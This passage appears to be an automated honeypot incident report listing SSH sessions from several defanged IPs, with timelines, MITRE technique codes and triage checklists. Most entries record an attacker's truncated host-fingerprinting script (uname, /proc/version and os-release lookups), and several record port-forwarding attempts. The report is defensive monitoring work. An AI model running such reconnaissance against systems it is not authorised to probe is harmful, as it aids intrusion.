| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.success` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:29` | `cowrie.log.closed` |
| `2026-08-15 06:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a095815ed4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:12 |
| **Last Seen** | 2026-08-15 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:12:29` | `cowrie.session.connect` |
| `2026-08-15 06:12:29` | `cowrie.client.version` |
| `2026-08-15 06:12:29` | `cowrie.client.kex` |
| `2026-08-15 06:12:30` | `cowrie.login.success` |
| `2026-08-15 06:12:31` | `cowrie.session.params` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.success` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.command.input` |
| `2026-08-15 06:12:31` | `cowrie.log.closed` |
| `2026-08-15 06:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63310a52cec4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:14 |
| **Last Seen** | 2026-08-15 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:14:33` | `cowrie.session.connect` |
| `2026-08-15 06:14:33` | `cowrie.client.version` |
| `2026-08-15 06:14:33` | `cowrie.client.kex` |
| `2026-08-15 06:14:34` | `cowrie.login.success` |
| `2026-08-15 06:14:36` | `cowrie.session.params` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.success` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.command.input` |
| `2026-08-15 06:14:36` | `cowrie.log.closed` |
| `2026-08-15 06:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f9b8ec5983

| Field | Detail |
|---|---|
| **Source IP** | `123.123.196[.]140` |
| **First Seen** | 2026-08-15 06:15 |
| **Last Seen** | 2026-08-15 06:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:15:44` | `cowrie.session.connect` |
| `2026-08-15 06:15:44` | `cowrie.client.version` |
| `2026-08-15 06:15:44` | `cowrie.client.kex` |
| `2026-08-15 06:15:47` | `cowrie.login.success` |
| `2026-08-15 06:15:48` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.123.196[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.123.196[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3371269c9ad6

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-15 06:15 |
| **Last Seen** | 2026-08-15 06:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:15:53` | `cowrie.session.connect` |
| `2026-08-15 06:15:53` | `cowrie.client.version` |
| `2026-08-15 06:15:53` | `cowrie.client.kex` |
| `2026-08-15 06:15:54` | `cowrie.login.success` |
| `2026-08-15 06:15:55` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56cb8001dfb0

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-08-15 06:16 |
| **Last Seen** | 2026-08-15 06:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:16:27` | `cowrie.session.connect` |
| `2026-08-15 06:16:27` | `cowrie.client.version` |
| `2026-08-15 06:16:27` | `cowrie.client.kex` |
| `2026-08-15 06:16:29` | `cowrie.login.success` |
| `2026-08-15 06:16:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f941fc5847

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:16 |
| **Last Seen** | 2026-08-15 06:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:16:29` | `cowrie.session.connect` |
| `2026-08-15 06:16:29` | `cowrie.client.version` |
| `2026-08-15 06:16:29` | `cowrie.client.kex` |
| `2026-08-15 06:16:31` | `cowrie.login.success` |
| `2026-08-15 06:16:32` | `cowrie.session.params` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.success` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:32` | `cowrie.command.input` |
| `2026-08-15 06:16:33` | `cowrie.log.closed` |
| `2026-08-15 06:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbf790b603ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:18 |
| **Last Seen** | 2026-08-15 06:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:18:19` | `cowrie.session.connect` |
| `2026-08-15 06:18:20` | `cowrie.client.version` |
| `2026-08-15 06:18:20` | `cowrie.client.kex` |
| `2026-08-15 06:18:21` | `cowrie.login.success` |
| `2026-08-15 06:18:23` | `cowrie.session.params` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.success` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.command.input` |
| `2026-08-15 06:18:23` | `cowrie.log.closed` |
| `2026-08-15 06:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2213d8a95c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:20 |
| **Last Seen** | 2026-08-15 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:20:10` | `cowrie.session.connect` |
| `2026-08-15 06:20:11` | `cowrie.client.version` |
| `2026-08-15 06:20:11` | `cowrie.client.kex` |
| `2026-08-15 06:20:12` | `cowrie.login.success` |
| `2026-08-15 06:20:13` | `cowrie.session.params` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.success` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:13` | `cowrie.command.input` |
| `2026-08-15 06:20:14` | `cowrie.log.closed` |
| `2026-08-15 06:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b70941edb3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:21 |
| **Last Seen** | 2026-08-15 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:21:59` | `cowrie.session.connect` |
| `2026-08-15 06:21:59` | `cowrie.client.version` |
| `2026-08-15 06:21:59` | `cowrie.client.kex` |
| `2026-08-15 06:22:01` | `cowrie.login.success` |
| `2026-08-15 06:22:02` | `cowrie.session.params` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.success` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:02` | `cowrie.command.input` |
| `2026-08-15 06:22:03` | `cowrie.log.closed` |
| `2026-08-15 06:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b78703b5b5c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:23 |
| **Last Seen** | 2026-08-15 06:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:23:45` | `cowrie.session.connect` |
| `2026-08-15 06:23:45` | `cowrie.client.version` |
| `2026-08-15 06:23:45` | `cowrie.client.kex` |
| `2026-08-15 06:23:46` | `cowrie.login.success` |
| `2026-08-15 06:23:48` | `cowrie.session.params` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.success` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.command.input` |
| `2026-08-15 06:23:48` | `cowrie.log.closed` |
| `2026-08-15 06:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0316bcf4c04d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:25 |
| **Last Seen** | 2026-08-15 06:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:25:33` | `cowrie.session.connect` |
| `2026-08-15 06:25:34` | `cowrie.client.version` |
| `2026-08-15 06:25:34` | `cowrie.client.kex` |
| `2026-08-15 06:25:35` | `cowrie.login.success` |
| `2026-08-15 06:25:36` | `cowrie.session.params` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.success` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:36` | `cowrie.command.input` |
| `2026-08-15 06:25:37` | `cowrie.log.closed` |
| `2026-08-15 06:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac96394d17f

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 06:25 |
| **Last Seen** | 2026-08-15 06:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:25:59` | `cowrie.session.connect` |
| `2026-08-15 06:25:59` | `cowrie.client.version` |
| `2026-08-15 06:25:59` | `cowrie.client.kex` |
| `2026-08-15 06:25:59` | `cowrie.login.success` |
| `2026-08-15 06:26:00` | `cowrie.session.params` |
| `2026-08-15 06:26:00` | `cowrie.command.input` |
| `2026-08-15 06:26:01` | `cowrie.log.closed` |
| `2026-08-15 06:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9436c7076906

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:27 |
| **Last Seen** | 2026-08-15 06:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:27:30` | `cowrie.session.connect` |
| `2026-08-15 06:27:30` | `cowrie.client.version` |
| `2026-08-15 06:27:30` | `cowrie.client.kex` |
| `2026-08-15 06:27:31` | `cowrie.login.success` |
| `2026-08-15 06:27:32` | `cowrie.session.params` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.success` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.command.input` |
| `2026-08-15 06:27:32` | `cowrie.log.closed` |
| `2026-08-15 06:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb26d5216cd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:29 |
| **Last Seen** | 2026-08-15 06:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:29:27` | `cowrie.session.connect` |
| `2026-08-15 06:29:27` | `cowrie.client.version` |
| `2026-08-15 06:29:27` | `cowrie.client.kex` |
| `2026-08-15 06:29:28` | `cowrie.login.success` |
| `2026-08-15 06:29:30` | `cowrie.session.params` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.success` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.command.input` |
| `2026-08-15 06:29:30` | `cowrie.log.closed` |
| `2026-08-15 06:29:31` | `cowrie.session.closed` |

